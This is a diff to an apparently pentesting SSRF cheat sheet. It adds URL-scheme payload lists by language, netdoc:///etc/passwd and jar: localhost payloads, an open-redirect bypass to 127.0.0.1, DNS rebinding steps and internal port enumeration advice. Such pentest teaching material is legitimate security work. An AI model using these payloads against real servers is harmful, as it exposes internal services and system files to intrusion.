@@ -43,14 +43,85 @@ In order to identify a SSRF vulnerability the first step is confirming that the 
 
 It should be noted that a function may still, potentially be vulnerable even if not identifid via Burp Collaborator, this is typically due to the target server not allowing outbound dns or strict egress firewall rules.  
 
-## Tips for filtered SSRF
+## SSRF Whitelist Filter Bypass 
 
 ### Timing Difference
 
 At the detection phase, try timing difference on responses to see if there is filtering in place when different domains, IP's or ports are being fitlered. 
 
+### URL Schema / Wrappers
 
-### Wrappers
+The following URL schemas can be potentially exploited by SSRF vulnerabilies. 
+
+The URL schemas have been sorted by framework / language. 
+
+
+
+#### PHP SSRF Wrappers / URL Schema 
+
+The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled). 
+
+```
+gopher://
+fd://
+expect://
+ogg://
+tftp://
+dict://
+ftp://
+ssh2://
+file://
+http://
+https://
+imap://
+pop3://
+mailto://
+smtp://
+telnet://
+```
+
+#### ASP.NET SSRF Wrappers / URL Schema 
+
+The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only). 
+
+```
+gopher://
+ftp://
+file://
+http://
+https://
+
+```
+
+#### Java SSRF Wrappers / URL Schema 
+
+The following wrappers are expected within Java environments, and can be used to potentially exploit [LFI](https://highon.coffee/blog/lfi-cheat-sheet/) vulnerabilities. 
+
+```
+ftp://
+file://
+http://
+https://
+gopher://
+netdoc:///etc/passwd
+netdoc:///etc/hosts
+jar:proto-schema://blah!/
+jar:http://localhost!/
+jar:http://127.0.0.1!/
+jar:http://0.0.0.0!/
+jar:ftp://local-domain.com!/
+```
+
+<div class="note tip">
+  <h5>NOTE: OpenJDK 8+ Redirects</h5>
+  <p>It should be noted that OpenJDK 8+ does not follow redirects if the protocols do not match. (credit: 0xatul) </p>
+</div>
+
+
+
+#### cURL SSRF Wrappers / URL Schema 
+
+The following wrappers are expected with environments using cURL. 
 
 ```
 file:///
@@ -59,9 +130,24 @@ sftp://
 ldap://
 tftp://
 gopher://
+ssh://
+http://
+https://
+imap://
+pop3://
+smtp://
+telnet://
 ```
+
+
+### Open Redirect SSRF Bypass 
+
+Open redirects can potentially be used to bypass server side whitelist filtering, by appearing to be from the target domain (which has an increased chance of being whitelisted).
+
+Example: 
+
 ```
-file:///, dict://, ftp://, gopher://
+/foo/bar?vuln-function=http://127.0.0.1:8888/secret
 ```
 
 ### Basic locahost bypass attempts 
@@ -167,6 +253,13 @@ To overcome this issue, have one of the resolution IP addresses in your control 
 1. go to https://lock.cmpxchg8b.com/rebinder.html add your IP's
 2. check it works with host 
 3. attempt to exploit the SSRF location with it
+
+
+## Post Exploitation / Enumeration - Increasing The Severity of SSRF
+
+In an effort to demonstrate the severity of the SSRF vulnerability enumeration of server side ports could be performed using Burp Intruder. 
+
+The above process could be performed to enumerate other local IP addresses and/or bruteforcing URL (IDOR / Forced Browsing) to identify services or functionality that was not intended by the organisation. 
 
 
 Happy hunting / pen testing. 
